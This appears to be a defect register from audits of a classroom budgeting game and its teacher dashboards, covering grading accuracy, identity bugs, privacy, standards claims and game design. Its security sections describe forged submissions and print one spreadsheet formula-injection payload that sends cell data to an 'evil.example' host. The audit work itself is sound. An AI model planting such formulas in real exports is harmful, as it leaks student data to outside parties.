# Defect register

Every row was reproduced against the running product by a fresh-context critic or by the lead.
`Source` names who found it. Nothing is listed here on the strength of a code reading alone.

Severity is **gap against the bar**, not effort.

## A · Evidence integrity — BOW claims more than it can support

| # | Sev | Defect | Source |
| --- | --- | --- | --- |
| A1 | CRITICAL | A required *explanation* requirement reads **Demonstrated**, under the heading `BOW`, on a submission whose written answer is the empty string. The reading queue offers the rubric directly beside "This student turned in no written explanation" and nothing blocks the save. | assessment |
| A2 | CRITICAL | **Teacher overrides change nothing.** Stored, shown in the trail, read by no roll-up: not the student headline, not the class percentage, not teach-next. A teacher who overrules BOW opens the class page and finds their judgement ignored. | assessment |
| A3 | HIGH | "A student whose writing nobody has read is not counted as assessed" is **false in one direction**: `masteryStateFor` tests for a level 0 before it tests for a missing level, so unread-and-flawed students enter the denominator as failures while unread-and-clean students are excluded. The page prints the opposite as a reassurance. | assessment |
| A4 | HIGH | The gradebook block turns **absences into zeros and into diagnoses**: `37 of 90 structured` and `Developing · Persistent gap` for a student who never reached the screen — 300px under the sentence "Absences, not zeros." `deriveGrade` and `summarizeConcepts` sit outside `nullNotZero.test.ts`. | assessment |
| A5 | HIGH | **Never-reached screens render as decisions made.** `?? false` collapses "never asked" into the opposite choice, so a student who stopped at the opening plan is reported as having "waited on the course" and "kept the Saturdays", and is counted into both distributions. | assessment |
| A6 | MEDIUM | One student's two attempts are **two students** in every count, and the row reading `Demonstrated` opens the attempt reading `Not yet demonstrated`. | assessment |
| A7 | MEDIUM | The Objective Map calls a class **`STRONG · 100% · 6 of 6`** from any five submissions, because `assignedStudents` is always null in practice so the denominator guard never engages. | assessment |
| A8 | MEDIUM | `plan-within-income.er1` is **unfailable in Basketball** (the reducer forces a balanced fallback before a run can be submitted) and a **zero in Run the Pop-Up**. The surfaces average the two. | assessment |
| A9 | LOW | Basketball's trail reports **one of the two reasons** behind a conjoined requirement; Pop-Up's reports both, and says in a comment why. | assessment |
| A10 | LOW | Class page caption `Counts across 0 of 6 with a usable result` sits above rows reading `6 demonstrated`. | assessment · lead |
| A11 | LOW | The debrief hands a teacher **unvetted, unread writing to read aloud** — `.slice(0, 4)` in submission order, no filter. First two quotes in a seeded class: "i just clicked stuff until the bar went green lol" and lorem ipsum. | assessment |

## B · World parity — one world is second-class

| # | Sev | Defect | Source |
| --- | --- | --- | --- |
| B1 | CRITICAL | The **Debrief is Basketball-only**. Title hard-codes `BASKETBALL_SCENARIO.title`; prompts, contrast pair and quotes are Basketball derivations. In a Pop-Up-only class it printed "You all played it the same way" for seven students who took three different booths, two sections under a table showing they had not. | lead · assessment |
| B2 | CRITICAL | `AFTER WEEK 5 · WHAT THEY GAVE UP FIRST` prints **Basketball-only questions at a whole-class denominator** (`6 of 15`, `0 of 15`) in a mixed class, and prints "No student reduced any part of their plan after Week 5" in a Pop-Up-only one. | lead · assessment |
| B3 | HIGH | **Run the Pop-Up produces no gradebook line at all.** In a class that lets students choose, half the room gets no Friday number. | lead · teacher |
| B4 | MEDIUM | The misconception spotlight **cannot read a Pop-Up student's writing** (`misconceptions.ts` matches only `DEFENSE_SUBMITTED`, never `POPUP_WRITEUP_SUBMITTED`) and blames a marking backlog that does not exist. | assessment |

## C · The loop is open at both ends

| # | Sev | Defect | Source |
| --- | --- | --- | --- |
| C1 | CRITICAL | **No feedback ever reaches a student.** The largest human-labour cost in the product produces nothing for the person who wrote the words. There is no route, no screen and no data path. | assessment · lead |
| C2 | CRITICAL | **No server-side record of an attempt in progress**, so the class page has two states — turned in, or does not exist. A teacher cannot see who has not started, who is stuck, or who stopped on Tuesday. | lead · teacher · dashboards |
| C3 | CRITICAL | **Silent session hijack on a shared device.** A second student opening the same URL on the same Chromebook lands inside the first student's unsubmitted attempt with no warning and no way out, and submits under their seat. | teacher |
| C4 | HIGH | **No cross-device resume.** The attempt is `localStorage` only, so homework across three days is unsafe as shipped: a device change silently loses everything, with no warning. | teacher · architecture |
| C5 | HIGH | A teacher cannot tell **who Seat 22 is**, so feedback, share-out selection and grading all require a paper key the teacher maintains themselves. | lead · teacher |
| C6 | HIGH | The teacher key exists in **exactly one browser with no recovery**. A cleared cache loses every class. | lead · identity |
| C7 | HIGH | The Debrief is a **report, not a share-out**: no selection, no sequencing, no per-item question, no projection mode, and `Seat 21` under a quote is the class's own identifier for a person while looking like anonymisation. | assessment |
| C8 | MEDIUM | **No gradebook export.** Friday's grading is 28 manual copy steps. | teacher |

## D · Security and privacy

| # | Sev | Defect | Source |
| --- | --- | --- | --- |
| D1 | BLOCKING | **Unauthenticated, unthrottled, cross-site-forgeable writes to any class.** 200 forged submissions accepted in 8.5s from origin `https://evil.example`; `text/plain` skips preflight and the server parses it as JSON regardless. | security |
| D2 | BLOCKING | **Class codes and teacher keys are drawn from `Math.random`** in both production entrypoints. V8's xorshift128+ state is recoverable from observed output, and anyone may create classes to observe it. | identity |
| D3 | HIGH | **No deletion path at all** — zero `DELETE` handlers, zero unlink. Expired classes answer `410` and stay on disk forever. A district cannot honour a deletion request, and the FTC's school-consent guidance makes that ability a precondition of the consent pathway BOW would rely on. | security · identity |
| D4 | HIGH | Unbounded submissions per class, and the teacher read returns **every full evidence log in one response**. | security |
| D5 | MEDIUM | The teacher key travels in the **URL query string** and is **echoed back** in the authenticated response body. | security |
| D6 | MEDIUM | CORS reflects an **arbitrary origin**. | security |
| D7 | LOW | Class label is world-readable before join; key comparison is not constant-time. | security |

## E · Standards honesty

| # | Sev | Defect | Source |
| --- | --- | --- | --- |
| E1 | HIGH | `/educator/guide` — the page linked from the top nav — badges **NYSED 1.2 as "Primary"** and prints 1.2's official sentence under it. The audited layer says 1.2 is not assessable at all, and `/educator/objectives` says so. Two live surfaces disagree, and the marketing-shaped one makes the stronger claim. | standards |
| E2 | HIGH | **No teacher-facing surface says "Grades 5–8."** "1 of the 23 in this framework" is measured against a document that publishes 70 objectives. Understated, but the denominator does not match the cited source. | standards |
| E3 | HIGH | `save-toward-a-goal → 5.1 full` rests on an **optional** evidence requirement, so 5.1 could resolve `demonstrated` with no evidence for the objective's first clause. Dormant today; an over-claim the day a world ships for it. | standards |
| E4 | MEDIUM | `1.6`, `2.3`, `2.4`, `4.4` claim `full` over objectives whose articulation demand ("summarizing… advantages, disadvantages, risks and consumer protections", "Explain strategies", "recommend actions") the competency does not require. | standards |
| E5 | MEDIUM | A standard is addressed as `{ frameworkId, code }`, but NYSED already has **three 1.1s** under one document. Adding the 9–12 band would silently merge two objectives. | standards |
| E6 | LOW | BOW's bar for 1.3 is **higher than NYSED's**, so `not yet demonstrated` is not the same as failing the state objective — and no surface says so. | standards |
| E7 | LOW | An unknown framework id renders "Nothing in this framework carries the code 1.3" — blaming the code, when the code was fine. | assessment |

## F · The game

| # | Sev | Defect | Source |
| --- | --- | --- | --- |
| F1 | HIGH | **Saturdays 2 and 3 are one decision wearing two dates.** One `POPUP_STOCK_ORDERED` action sets both nights; `crowdOn()` returns the identical crowd for Saturdays 1–3; the copy says "You cook the same again on Saturday 3." | popup · sims |
| F2 | HIGH | **Basketball Weeks 1–4 are a scrolling read with no input** — four story cards whose own deck says "Nothing here is new." Counting decisions rather than dates, both worlds have ~3–4, not 8 and 4. | sims · lead |
| F3 | HIGH | Pop-Up's ending is **causally shallower** than Basketball's: one aggregate verdict where Basketball gives a per-decision COST YOU / PAID OFF / FELL SHORT list — although the underlying outcome data already breaks out every part it would need. | popup |
| F4 | MEDIUM | The **first real trade-off is ~95 seconds in**, at the edge of the two-minute window the onboarding research treats as decisive. | sims |
| F5 | MEDIUM | Pop-Up declares **1,866 words** on its one path against a ~22-minute budget: over 12 minutes of reading at 150 wpm before any arithmetic. Its pitch screen alone runs ~230–250 words. | sims · game-ux |
| F6 | MEDIUM | The catering job's copy promises the studio "will not decide until the second Saturday"; the verdict is only revealed after the **third**. | popup |
| F7 | MEDIUM | There is **no visually distinct ending state** — Week 8 reuses the Week 5 crisis template, and the submitted screen drops to the calmest template in the product at the moment that needs the most ceremony. | game-ux |

## G · Copy, visual, coherence

| # | Sev | Defect | Source |
| --- | --- | --- | --- |
| G1 | CRITICAL | The world picker tells the student **they are being measured** — "Your teacher wants to see that you can build a budget that works" — in the exact words the food-truck world's own header says a student must never be told. | copy · lead · game-ux |
| G2 | HIGH | Pop-Up promises **"A person reads this and writes back"** — a feature that does not exist. Basketball's parallel line correctly promises only reading. | copy |
| G3 | HIGH | The **sample class renders a different, richer component** than the real class dashboard ever produces, teaching a teacher a surface the product does not have. | teacher |
| G4 | HIGH | At **1024px** the Week 1–4 story cards wrap to roughly one word per line for fifteen lines each. 1366 and 640 are fine. | copy |
| G5 | HIGH | **Vocabulary sprawl**: five overlapping systems for "what a student can do" (concept, competency, objective, micro-skill, evidence requirement) and four adjective families for "how independently", all inside a two-click radius. | copy |
| G6 | MEDIUM | The home page sells Basketball only; the next screen says "Two ways in. You pick one." | lead |
| G7 | MEDIUM | `/educator/assign` and `/educator/classes/new` render the identical page. | lead |
| G8 | MEDIUM | The class-setup form is not aligned to the page measure at 1366. | lead |
| G9 | MEDIUM | The 10-second test fails on a wall of identical `Not assessed yet` rows under the headline `Nobody is assessed yet.` | lead · dashboards |
| G10 | LOW | The Objective Map leads with three bold all-zero stats in the band read first, with no next step attached. | dashboards |
| G11 | LOW | The one-time private class link is explained in a 40-word run-on shown exactly once. | copy |


---

# Round 2 — defects found in Round 1's own work

Round 1 built accounts, a student home, a live class view, a gradebook line, a share-out and a
feedback loop. Three fresh critics were then pointed at that work with the running product in
front of them and told they were allowed to reject it. Two of them did.

`accounts` = the accounts/teacher-surface critic (**REJECT**). `density` = the game-design
critic (**REJECT**). `copy` = the whole-product copy audit. Everything below was reproduced
against the running app.

## H · Identity — the thing built to close a hole opened a worse one

| # | Sev | Defect | Source |
| --- | --- | --- | --- |
| H1 | CRITICAL | **Two students signing in one after the other on a shared Chromebook become one account.** `claim()` read `studentId ?? entry.studentId` — the browser's ambient token first, the seat's own owner second — so the second child, tapping their own name and typing their own card, captured the first child's account and dragged it onto their own seat. A child's own phone, which nobody else touched, then showed a named classmate's plan and that classmate's private teacher feedback; and one account holding two seats could turn work in under the other child's name and be accepted `202`. Reproduced twice, on two builds an hour apart. The roster ends up holding one account per two seats. | accounts |
| H2 | HIGH | **Forty join attempts from one school IP lock the whole room out of the lesson.** The window is per class and charges successes, so thirty students signing in plus ten typos is the limit. The message says "wait a minute"; the window is ten. The only other advice on screen — "Lost your card? Ask your teacher — they can print a new one" — is actively wrong: a freshly printed card is refused identically. | accounts |
| H3 | MEDIUM | **Any five-character class code returns the class's full list of children's names, unauthenticated.** Every other route in a class refuses a second teacher's token; this one is open to anybody. A class code is written on a whiteboard, read aloud, photographed and typed into group chats. | accounts |
| H4 | HIGH | *(lead, before the critic reported)* **A rostered class refused every submission the product itself produced.** The service began requiring a student session on submission; the evidence transport never sent one. A student played a complete run and was refused at the end, with a retry that could never succeed. Compounded by `OpeningStage` still being a second, obsolete sign-in door asking for a hand-typed class code and seat number. | lead |
| H5 | MEDIUM | *(lead)* **An open class became a roster class the moment one student named themselves**, because join mode was derived from "does this class have any roster rows". The second student arrived at a list of one name that was not theirs, with no way to add themselves and a card nobody had given them. | lead |
| H6 | MEDIUM | *(lead)* **The class-creation rate limit is keyed on the egress address at thirty an hour.** A school district is one egress address: forty teachers in a September PD session, each making their four classes, is a hundred and sixty legitimate creations, of which this refused a hundred and thirty. | lead · persistence |

## I · Teacher surfaces — the new ones

| # | Sev | Defect | Source |
| --- | --- | --- | --- |
| I1 | HIGH | **"Still working" is structurally impossible.** `checkpointAttempt` and `readMyAttempt` are exported and called from nowhere, so `progress` is always empty. A student twenty minutes into a run is named on the teacher's screen as *"Not started"*, and the student's own home can never show "Carry on". `GAUNTLET_STATUS.md` listed server-side checkpoints as shipped. | accounts |
| I2 | HIGH | **The teacher's private share-out note is projected to the room** at 14px, bottom-right, under a heading saying the note is theirs. Present mode *is* the projector. The note is also pre-filled with BOW's own machine-generated reason. | accounts |
| I3 | HIGH | **The share-out silently excludes the entire Pop-Up world in a mixed class** — and only in a mixed class; a Pop-Up-only class offers Pop-Up candidates normally, and the same mixed class's reading queue and debrief both carry the work. | accounts |
| I4 | HIGH | **A second feedback note silently destroys the first.** One record per `(class, seat, session)`. The composer says "Say something else"; the student home renders a list. The first note is never seen and no longer exists anywhere. | accounts |
| I5 | MEDIUM | **Three different answers to "how many turned in", two of them in one viewport.** The headline counts submission records, the tiles count distinct seats, and neither is filtered against the live roster — so removing a student makes the panel report a class larger than the class. | accounts |
| I6 | MEDIUM | **The gradebook export is not roster-shaped**: a student on the roster who did not turn in has no row at all (an absence is a missing line, not a blank one), a removed seat does have one, and one seat appears twice with contradictory numbers and no column to tell the attempts apart. | accounts |
| I7 | MEDIUM | **The share-out offers one submission twice with two contradictory reasons**, and choosing either marks both. Removed students are offered for projection. | accounts |
| I8 | MEDIUM | **Two routes do the same job from adjacent buttons** — the debrief's "read these aloud" and the share-out's "pick what the room sees" — and the newer one has strictly less coverage than the one it was built to replace. | accounts |
| I9 | LOW | Focus is never moved on a join step change (`document.activeElement` is `<BODY>` at all three steps); `Not started: Leila H..`; the 390px header wraps `Ana`/`R.` and `Not`/`you?`; a short class code plus Next is a silent no-op; refreshing on step 2 or 3 returns to step 1; teacher sign-out drops a student to the class-code screen with no message; a 16,200-character feedback note is truncated to 400 mid-word and answered `201`. | accounts |

## J · The game — reading, not deciding

| # | Sev | Defect | Source |
| --- | --- | --- | --- |
| J1 | CRITICAL | **The reading-to-decision ratio makes the run unplayable in the period it is sold for.** 3,167 measured words of Basketball prose buy about ten real decisions. At the product's *own* assumed 150 wpm that is 21 minutes of pure reading against a declared 18m15s budget for the entire run. Both worlds' declared word counts understate: Basketball declares 1,180 against 3,167 measured (2.7×), Pop-Up 1,866 against 2,405. Pop-Up's own word test filters out every string of three words or fewer; Basketball has no word test at all. | density |
| J2 | HIGH | **Three Basketball screens accept no input at all** — `role-contract`, `season-weeks` (Weeks 1–4, deck: *"Nothing here is new"*, 321 words, one advance click, evidence log `1 event → STAGE_ENTERED`) and `week8-resolution`. | density |
| J3 | HIGH | **Three of the Pop-Up's four Saturdays are the same night.** `crowdOn()` returns `spot.crowd` for Saturdays 1, 2 and 3; the results panel prints two byte-identical cards. Takings never refill the stock line and the rebate lands in `cushion`, so no new information bears on the one order. A live "WOULD GO IN THE BIN: 0" readout also solves the world's stated core tension for the student. | density |
| J4 | HIGH | **The Pop-Up's ending has no verdicts.** Basketball prints four sorted `PAID OFF / COST YOU / FELL SHORT` verdicts with counterfactuals; Pop-Up prints a table it has already shown. In a deliberately bad run, a helper worked a night with no food and the ending never mentions her. | density |
| J5 | MEDIUM | *(fixed)* Basketball headed a verdict **"No effect"** directly above a sentence saying Avery paid more. | density |
| J6 | MEDIUM | **The first genuine trade-off is 174s–218s in** (435 words of prose before it, at 150–120 wpm), 244–305s including the screen itself. The ~95s figure is the first screen with any control, and that control is a ranking quiz with no scaffold — four wrong attempts return the same hint, so it is a hard stop. | density |

## K · Copy

| # | Sev | Defect | Source |
| --- | --- | --- | --- |
| K1 | CRITICAL | **The grade band disagrees with itself**: `Grades 6–8` on the front door and the educator guide, `Grades 5–8` on the objectives page and throughout the competency spine. | copy |
| K2 | CRITICAL | **Four teacher surfaces tell teachers to hand out seat numbers** the student flow no longer asks for anywhere. A teacher following the printed instructions breaks the lesson in the room. | copy |
| K3 | CRITICAL | **The worst string in the product**, restated with the reason: *"Your teacher wants to see that you can build a budget that works."* It is the only sentence in the student flow that tells a child what the adult is looking for; it is false for the story half of them are about to pick; it asserts a teacher motive BOW cannot know; and it hands the student the shape of the answer the two-world design exists to withhold. Every other CRITICAL was true once — this one never was. | copy |
| K4 | MAJOR | **Four ladders of vocabulary, not one.** 22 further findings, and a full canonical proposal: one name per thing (`challenge` / `story` / `skill` / `what the work had to show` / `objective` / `topic`), one ladder for a requirement, one for a student's skill, and a deliberately different one for a class — because today "Developing" means both a child and a room, and both appear on one page within a scroll. Five dead exports (`STATUS_LABELS`, `TRAJECTORY_LABELS`, `STATUS_ORDER`, `MicroBucket`, `GradeResult.summary`) are still documented as "the words the educator surface uses", which is how a taxonomy comes back. | copy |

## Considered and not accepted

| Claim | Source | Why not |
| --- | --- | --- |
| `SETUP_SELECTED`, `POPUP_SPOT_SELECTED`, `COURSE_DEPOSIT_DECIDED` and the other consequential decisions "are graded nowhere". | density | Half accepted. They are deliberately not tagged: `eventConcepts.ts` only names a requirement the world's observer actually produces, and `evidenceEnvelope.test.ts` fails if a tag appears that nothing can observe. Which place Avery lives in is a preference the balance harness proves has no dominant answer, and grading a preference is grading taste. What *is* judged is whether the plan that follows the choice works, and what the student says about it. The half that stands: the **consequences** of those choices must reach a requirement, and where a decision has a right answer available — the need/want/committed sort in J2's replacement — it should produce one. |


## L · The vendor review — what a district would refuse to deploy

A security and privacy red team ran a private copy of the shipped server against the file
store, attacked every route, read the whole server and the front-end fetch and render paths,
and researched the live text of FERPA §99.31, the April-2025 COPPA Rule, NY Education Law §2-d
and 8 NYCRR Part 121. Its verdict: **DEPLOY WITH CONDITIONS**, with an explicit carve-out to
**REFUSE the self-hosted file-store configuration** until it encrypted at rest and deleted at
the retention horizon. Full report: `gauntlet/critiques/vendor-review.md`.

| # | Sev | Defect | State |
| --- | --- | --- | --- |
| L1 | BLOCKER | **Children's names, every class's teacher key, and the HMAC secret that signs every session token, in plaintext on disk.** One disk image, one stray backup, one restored volume: every class's names and evidence, plus the ability to mint a valid token for anybody in the deployment. Nothing between "read a file" and "own the district". | **Closed** — every durable write is AES-256-GCM sealed, the signing secret is derived from the operator's key and written nowhere, and a disk store with no key refuses to start. Proved against the bytes on disk, not against the store's interface. |
| L2 | MAJOR | **"Kept for 120 days, then deleted" was executed by nothing.** `deleteClass` had one caller — the manual route. Reads gated on `expiresAt` and answered 404, so expired data was hidden, not deleted, and a self-hosted district accumulated children's names for ever while the product said it did not. | **Closed** — an hourly sweep on a long-running server, an opportunistic one on serverless, and `GET /health` reports when it last ran and what it removed. |
| L3 | MAJOR | **No per-student deletion.** Removing a seat is a tombstone that keeps the name and every row. A district could honour a parent's erasure request only by destroying the other twenty-nine students' work. | **Closed** — `DELETE /classes/:code/roster/:seat?erase=1`, and an **Erase** control on the class list that names the child and says it cannot be undone. |
| L4 | MAJOR | The only third party that ever receives student data is the KV subprocessor, and that needs a DPA the repo cannot show. Hosting region, sub-processor agreement and at-rest attestation are contractual, not code. | **Open, and contractual.** Setting `BOW_STORE_KEY` on the managed path now means the subprocessor holds ciphertext, which changes the conversation but does not end it. |
| L5 | MAJOR | **An open-join class accepted anonymous, forged evidence from the class code alone.** A `POST` with no session, `seatCode: "7"`, and a valid log returned `202` and appeared in the teacher's evidence room. | **Closed** — every submission requires a student session and a seat that account holds, in every class. The exception was written for classes created before accounts; the only door now issues a session on the open path too. |
| L6 | MINOR | **Spreadsheet formula injection** through a student-typed display name into the gradebook export: `=HYPERLINK("http://evil.example/?"&A1,"grade")` reached a live cell. | **Closed** — a cell beginning `=`, `+`, `-` or `@` is prefixed. |
| L7 | MINOR | **No CSP and no security headers** anywhere. React's escaping is what actually stops a stored name executing; nothing stopped the next mistake. | **Closed** — CSP, `nosniff`, `DENY`, `Referrer-Policy` and `no-store` on the API; the same plus HSTS and `frame-ancestors` as real headers from the host. Verified: zero violations across seven surfaces. |
| L8 | MINOR | **The token-signing secret was minted from `Math.random()`** — the one generator this codebase had already replaced for class codes, still in use for the most important secret in the system. | **Closed** — derived from the store key, or `randomBytes(32)`. |
| L9 | MINOR | **Self-hosted transit is plain HTTP with no TLS guidance.** | **Closed** — binds loopback by default, says so when opened wider, and the README states the requirement. |
| L10 | MINOR | Deleting a class left orphaned account records. | **Closed** — a student account with no remaining seat goes with the class. |

### What held up, and is worth writing down

The reviewer could not reproduce any cross-student, cross-teacher or unauthenticated disclosure
of a child's name or work. The whole `alg:none`/tamper/expiry family is rejected. The vendor's
record of a student is `{id, createdAt}` — no email, no date of birth, no school, no device, no
clickstream. The supply chain is four runtime dependencies with no analytics, no CDN, no web
font and no tracker, and no student writing is sent to any model: zero outbound calls except
this deployment's own API, enumerated. And the product does not claim FERPA, COPPA or §2-d
compliance anywhere, which is the rule it set itself.


## M · The teacher's product, played for five periods

A fresh-context critic set up a class of 28 from nothing, ran a 42-minute lesson, marked the
writing, ran a share-out, exported a gradebook and overruled BOW — and returned **REJECT**.
Full report and screenshots: `gauntlet/critiques/teacher-experience.md`, `gauntlet/receipts/teacher/`.

| # | Sev | Defect | State |
| --- | --- | --- | --- |
| M1 | BLOCKER | **A teacher has no account.** A census of all four educator routes found zero password fields, zero email fields and zero sign-in controls — while `POST /auth/teacher`, `POST /auth/teacher/session`, `GET /me/teaching` and `POST /classes/:code/claim` had all been answering correctly for hours with nothing calling any of them. Classes lived in one browser's storage plus a link the product says is shown once, so a reimaged laptop permanently destroyed twenty-eight children's assessed work. | **Closed** — `/educator/sign-in`. Verified in two isolated browser contexts: a class made without an account, by a teacher who then signs up, is on the classes page of a browser that has never seen it. Signing in also claims what the browser already holds. |
| M2 | MAJOR | **The empty class shows nothing about the room**, and that is the first ten minutes of every lesson: "Nothing turned in yet · 0 turned in" to a teacher standing in a room of twenty-eight working students. | **Closed** — the live panel renders whenever anybody is working, names who is mid-run and on which screen, and names who has not started. |
| M3 | MAJOR | **The headline is a fact about one child, set larger than everything else.** Mid-lesson: *"0 of 1 assessed showed the skill"* in the page's largest type, over a class of twenty-eight, with "22 awaiting your reading" in small grey text at the right edge. Finished and read: *"92% demonstrated"* — a percentage of twelve children in a class of thirty. This is the 10-second test, and it fails. | Open, in flight. |
| M4 | MAJOR | **The same class reports different numbers on three teacher screens** — and the one saying twenty-three is the debrief, the page a teacher prints and reads aloud to a room of twenty-two. | **Closed** — the debrief and the reading queue now count the class with the same function the class page uses. |
| M5 | MAJOR | **Reopening the same browser tells a student their run is "open in another tab"**, which is false — the tab is gone. | Open, in flight. |
| M6 | MAJOR | A student who turned in twice is **shown four different ways on four surfaces**. | Open, in flight. |
| M7 | MAJOR | The share-out offers **seven candidates with a reason that is true of every student in the class**. A reason a teacher cannot trust is worse than no reason. | Open, in flight. |
| M8–M12 | MINOR | "STILL WORKING" never ages out under a heading reading "RIGHT NOW"; "Teacher readings" counts overrules rather than readings; double-pasting a class list silently doubles the roster; no total, with the denominator a mark needs varying per student; numbers without denominators throughout. | Open, in flight. |

### What the critic said held up, in its own words

The reading queue, the export, the overrule flow, the live room panel and the debrief are *"at
or above the bar of tools I already use"* — and the export is *"the only one I've used that
distinguishes an absentee from a zero"*. Its answer to "would a teacher use this a second
time" was **yes**; to a third time, *"not on a class whose marks I have to defend"* — which
was the account blocker, and is now closed.

### The measurement worth keeping

Class created in 4.8s. Twenty-eight names pasted to printable cards in 3.3s at the API. A
careful human read plus four rubric judgements is **45–75 seconds per student**, so marking a
class of twenty-eight is **21–35 minutes**. With the run itself at 22–28 minutes, this is a
two-lesson resource. It is not a defect that it is; it is a defect if the product implies it
is not.


## N · What the lead found by using it, between rounds

Not a critic's list. These are things I hit while verifying somebody else's claim in a real
browser, on HEAD `8830342`, against the snapshot at `.scratch/lead/`. Receipts:
`gauntlet/receipts/lead-teacher/`.

| # | Sev | Defect | State |
| --- | --- | --- | --- |
| N1 | — | **M1 independently re-verified, and it holds.** I made an account, made a class on one browser context, then opened a second context that had never seen the product, signed in, and the class was on the page: *"Your class. On your account, so they are here on any computer you sign in on. GVVTA · created 8/19/2026."* Receipts `07-laptop-two-cold.png`, `08-laptop-two-signed-in.png`, `09-laptop-two-classes.png`. | **Closed, confirmed by someone who did not build it.** |
| N2 | MAJOR | **A class cannot be renamed. Ever.** There is no rename control on any educator surface and no route that would accept one — the API has `POST /classes`, `DELETE`, and nothing between. A teacher who mistypes "Perido 6", or who presses *Create the class* before typing anything, is stuck with that name for the class's whole 120-day life: on the class list, on every printed card, on the debrief they read aloud, and in the exported gradebook. | Open. |
| N4 | — | **The teacher critic's headline finding re-verified by me, at HEAD `d9c8a72`.** A class of twelve, four signed in and working, nobody finished — the moment the critic said the page was useless. It now reads **"8 of 12 have not started."** in the largest type, then "4 of 12 are working. 0 of 12 turned in", then all eight names. Every numeral on the screen carries the thing it is a count of. The class code is on the page and there is a **Rename** control beside the title. Receipts `20-class-midlesson-viewport.png`, `21-class-midlesson-full.png`. | **Closed, confirmed by someone who did not build it.** |
| N5 | MINOR | **The sentence naming who has not started ends in a double stop** — "Ezra B. and Juno F.**..**" — because `seatLabels()` already ends in a full stop and the sentence appends another. Seen live in the same receipt. Independently found by the coherence critic. | Routed. |
| N3 | MINOR | **An empty class name is accepted and silently becomes "Untitled class"** — the default is written twice, once in `MyClasses.tsx:82` and once in `handler.ts:262`. I hit it by pressing *Create the class* with the field untouched, which is exactly what a teacher setting up between periods does. With N2 unfixed it is permanent, and a five-period teacher can end a day with three classes called *Untitled class*, told apart only by a five-letter code and a date. | Open. |

**Why N2 is a MAJOR and not a nit.** The teacher critic measured class creation at 4.8 seconds
and marking at 21–35 minutes per class. The product is deliberately built so setup is cheap and
the expensive part is reading children's writing — which means setup is exactly where a teacher
moves fast and gets it wrong, and the product's answer to a typo is currently *delete the class
and lose everything in it*.


## N (continued) · The headline claim, checked by the lead after the agent's evidence was lost

**N6 — the instrument now tells a decision from a click, and I verified it at the layer a
teacher reads.** The student red team's largest finding was that three students who left the
savings line untouched were reported to their teachers as having planned a figure
*Independently*, and that a run finished in 71.6 seconds of shortcut-clicking came back as a
demonstrated competency. A fix landed; the container restart destroyed the agent's verification
of it before it was written down.

So I built two runs that are identical in every respect except **which row took the last of the
money**, and read what the teacher's surface says about each. Both plans balance; both spend the
same money; both were saved at the first attempt.

| | `er3` — savings is a planned amount | competency |
| --- | --- | --- |
| the student named a spending row to take the remainder, and set the savings figure themselves | **5** | `incomplete` |
| the student let the **savings** row take whatever was left | **0** | `not-yet-demonstrated` |

The rule holds, and the reason sentence is a fact about the run rather than a verdict on the
child: *"Where the figure on the course line came from when the opening plan was closed. The
course is what Avery is saving into, so a student who let that row take what was left…"*

Two things worth noting beyond the finding. The good run reads **`incomplete`**, not
`demonstrated` — because `er5` is the written defence and it is `null` until a person has read
it, which is the no-machine-marks-writing rule holding where it counts. And the requirement that
moved is the one that *should* move: the arithmetic requirements are 5 in both runs, because the
student did the arithmetic in both. A rule that had punished the whole competency would have been
a blunter instrument, not a better one.

Checked at HEAD by the lead, on the domain the educator surfaces read from, not on a screenshot.


**N7 — BLOCKER-2 verified closed by the lead.** The coherence critic's second blocker was that
one world reaches the teacher in English and the other in code: a pop-up student's evidence page
printed `popup-spot`, `POPUP_SUM_SUBMITTED` and `event-5` where a basketball student's printed
sentences. A fix landed and its author's verification was destroyed by the restart, so I
rendered the real panel over a real market run and read what a teacher gets:

> *"Working out what the market wants before a single plate is sold — the permit and the booth
> for the spot the student chose — and then building the plan on what is left rather than on the
> whole account. The total owed before the first Saturday came out right at the first attempt."*
>
> *"Closing the opening plan by sending the last of the money to a named line. Your cut is the
> money the student is banking for themselves, so a student who sends the leftovers there has let
> the arithmetic set their pay… **Your cut held a figure the student set, and another line took
> the last of the money.**"*

No event type, no stage id and no `event-N` anywhere in the rendered trail. And the second
sentence is the provenance rule from N6 working in the *other* world — the same rule, the same
words, on a run in the market rather than the season, which is what "one product" was supposed to
mean.

**N8 — the unit suite at HEAD: 1,315 passing, 0 failing, 1 skipped**, across 107 files, with
`npx tsc -b` clean and `scripts/verify-head.sh` confirming the commit builds from a clean
checkout rather than only the working tree.
